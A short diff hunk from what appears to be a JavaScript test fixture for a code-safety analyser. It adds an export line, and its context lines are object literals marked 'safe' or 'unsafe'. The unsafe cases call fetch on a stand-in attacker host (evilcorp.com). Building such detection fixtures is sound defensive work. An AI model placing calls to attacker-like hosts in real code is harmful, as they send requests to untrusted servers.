@@ -41,6 +41,7 @@ const sim_012 = sim_011;                                     // declared with id
 // Object cases
 // obj = object
 const obj_001 = { a: 'A safe string' };                                                                                                          // all properties safe
+exports = { obj_001 };
 const obj_002 = { a: fetch('https://evilcorp.com/hackyhacky') }                                                                            // unsafe property
 const obj_003 = { a: 'A safe string', b: 'A safe string2' };                                                                                     // all properties safe
 const obj_004 = { a: fetch('https://evilcorp.com/hackyhacky'), b: 'A safe string' };                                                       // unsafe property
